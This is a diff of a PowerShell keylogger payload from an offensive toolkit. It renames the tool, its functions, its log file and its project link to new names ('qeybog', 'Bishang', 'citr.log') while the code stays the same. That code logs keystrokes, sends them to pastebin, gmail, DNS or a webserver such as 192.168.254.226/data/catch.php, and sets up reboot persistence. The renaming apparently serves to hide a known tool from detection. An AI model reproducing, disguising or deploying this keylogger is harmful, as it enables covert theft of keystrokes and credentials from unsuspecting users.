@@ -1,11 +1,11 @@
 <#
 .SYNOPSIS
-Nishang Payload which logs keys.
+Bishang Payload which logs keys.
 
 .DESCRIPTION
-This payload logs a user's keys and writes them to file key.log (I know its bad :|) in user's temp directory.
+This payload logs a user's keys and writes them to file citr.log (I know its bad :|) in user's temp directory.
 The keys are than pasted to pastebin|tinypaste|gmail|all as per selection. Saved keys could then be decoded
-using the Parse_Key script in nishang.
+using the Parse_Key script in Bishang.
 
 .PARAMETER persist
 Use this parameter to achieve reboot persistence. Different methods of persistence with Admin access and normal user access.
@@ -35,32 +35,32 @@ The DomainName, whose subdomains would be used for sending TXT queries to.
 Authoritative Name Server for the domain specified in DomainName
 
 .PARAMETER MagicString
-The string which when found at CheckURL will stop the keylogger.
+The string which when found at CheckURL will stop the qeybog.
 
 .PARAMETER CheckURL
 The URL which would contain the MagicString used to stop keylogging.
 
 .EXAMPLE
-PS > .\Keylogger.ps1
+PS > .\qeybog.ps1
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis
+PS > .\qeybog.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis
 Use above when using the payload from non-interactive shells and no exfiltration is required.
 
 .EXAMPLE
-PS > .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php
+PS > .\qeybog.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php
 Use above for exfiltration to a webserver which logs POST requests
 
 
 .EXAMPLE
-PS > .\Keylogger.ps1 -persist
+PS > .\qeybog.ps1 -persist
 
 Use above for reboot persistence.
 
 .LINK
 http://labofapenetrationtester.com/
-https://github.com/samratashok/nishang
+https://github.com/samratashok/Bishang
 #>
 
     [CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
@@ -116,7 +116,7 @@ https://github.com/samratashok/nishang
 
 $functions =  {
 
-function script:Keylogger
+function script:qeybog
 {
     Param ( 
         [Parameter(Position = 0, Mandatory = $True)]
@@ -193,7 +193,7 @@ function script:Keylogger
                 } 
                 $now = Get-Date; 
                 $logLine = "$result " 
-                $filename = "$env:temp\key.log" 
+                $filename = "$env:temp\citr.log" 
                 Out-File -FilePath $fileName -Append -InputObject "$logLine" 
 
             }
@@ -253,11 +253,11 @@ function script:Keylogger
         { 
             $read = 0
             Start-Sleep -Seconds 5 
-            $pastevalue=Get-Content $env:temp\key.log 
+            $pastevalue=Get-Content $env:temp\citr.log 
             $read++
             if ($read -eq 30)
             {
-                Out-File -FilePath $env:temp\key.log -Force -InputObject " " 
+                Out-File -FilePath $env:temp\citr.log -Force -InputObject " " 
                 $read = 0
             }
             $now = Get-Date; 
@@ -361,7 +361,7 @@ function script:Keylogger
     {
         $name = "persist.vbs" 
         $options = "start-job -InitializationScript `$functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)"
-        $options2 = "start-job -InitializationScript `$functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)"
+        $options2 = "start-job -InitializationScript `$functions -scriptblock {qeybog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)"
         $func = $functions.Tostring()
         Out-File -InputObject '$functions =  {' -Force $env:TEMP\$modulename
         Out-File -InputObject $func -Append $env:TEMP\$modulename
@@ -380,10 +380,10 @@ function script:Keylogger
         if ($exfil -eq $True)
         {
             start-job -InitializationScript $functions -scriptblock {Keypaste $args[0] $args[1] $args[2] $args[3] $args[4] $args[5] $args[6] $args[7]} -ArgumentList @($ExfilOption,$dev_key,$username,$password,$URL,$AuthNS,$MagicString,$CheckURL)
-            start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
+            start-job -InitializationScript $functions -scriptblock {qeybog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
         }
         else
         {
-            start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
+            start-job -InitializationScript $functions -scriptblock {qeybog $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
         }
     }
